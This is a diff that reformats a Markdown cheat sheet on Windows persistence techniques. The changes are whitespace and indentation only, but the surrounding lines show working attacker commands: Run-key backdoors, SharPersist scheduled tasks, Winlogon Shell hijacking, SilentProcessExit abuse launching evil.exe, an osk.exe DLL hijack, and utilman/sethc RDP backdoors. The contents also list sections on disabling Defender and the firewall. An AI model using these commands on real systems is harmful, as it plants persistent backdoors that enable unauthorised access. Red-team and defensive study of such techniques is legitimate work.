@@ -6,28 +6,27 @@
 * [Disable Windows Defender](#disable-windows-defender)
 * [Disable Windows Firewall](#disable-windows-firewall)
 * [Simple User](#simple-user)
-    * [Registry HKCU](#registry-hkcu)
-    * [Startup](#startup)
-    * [Scheduled Task](#scheduled-task)
-    * [BITS Jobs](#bits-jobs)
+  * [Registry HKCU](#registry-hkcu)
+  * [Startup](#startup)
+  * [Scheduled Task](#scheduled-task)
+  * [BITS Jobs](#bits-jobs)
 * [Serviceland](#serviceland)
-    * [IIS](#iis)
-    * [Windows Service](#windows-service)
+  * [IIS](#iis)
+  * [Windows Service](#windows-service)
 * [Elevated](#elevated)
-    * [Registry HKLM](#registry-hklm)
-        * [Winlogon Helper DLL](#)
-        * [GlobalFlag](#)
-    * [Services](#services)
-    * [Scheduled Task](#scheduled-task)
-    * [Binary Replacement](#binary-replacement)
-        * [Binary Replacement on Windows XP+](#binary-replacement-on-windows-xp)
-        * [Binary Replacement on Windows 10+](#binary-replacement-on-windows-10)
-    * [RDP Backdoor](#rdp-backdoor)
-        * [utilman.exe](#utilman.exe)
-        * [sethc.exe](#sethc.exe)
-    * [Skeleton Key](#skeleton-key)
+  * [Registry HKLM](#registry-hklm)
+    * [Winlogon Helper DLL](#)
+    * [GlobalFlag](#)
+  * [Services](#services)
+  * [Scheduled Task](#scheduled-task)
+  * [Binary Replacement](#binary-replacement)
+    * [Binary Replacement on Windows XP+](#binary-replacement-on-windows-xp)
+    * [Binary Replacement on Windows 10+](#binary-replacement-on-windows-10)
+  * [RDP Backdoor](#rdp-backdoor)
+    * [utilman.exe](#utilman.exe)
+    * [sethc.exe](#sethc.exe)
+  * [Skeleton Key](#skeleton-key)
 * [References](#references)
-
 
 ## Tools
 
@@ -68,7 +67,7 @@ Value name:  Backdoor
 Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
 ```
 
-Using the command line 
+Using the command line
 
 ```powershell
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
@@ -122,7 +121,6 @@ SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
 ```
 
-
 ### BITS Jobs
 
 ```powershell
@@ -170,7 +168,7 @@ Value name:  Backdoor
 Value data:  C:\Windows\Temp\backdoor.exe
 ```
 
-Using the command line 
+Using the command line
 
 ```powershell
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
@@ -193,7 +191,6 @@ Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" 
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
 ```
 
-
 #### GlobalFlag
 
 > Run executable after notepad is killed
@@ -203,7 +200,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
-
 
 ### Services
 
@@ -248,7 +244,6 @@ Exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** exec
 
 Create a malicious **HID.dll** in  `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
 
-
 ### RDP Backdoor
 
 #### utilman.exe
@@ -260,7 +255,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 ```
 
 #### sethc.exe
- 
+
 Hit F5 a bunch of times when you are at the RDP login screen.
 
 ```powershell
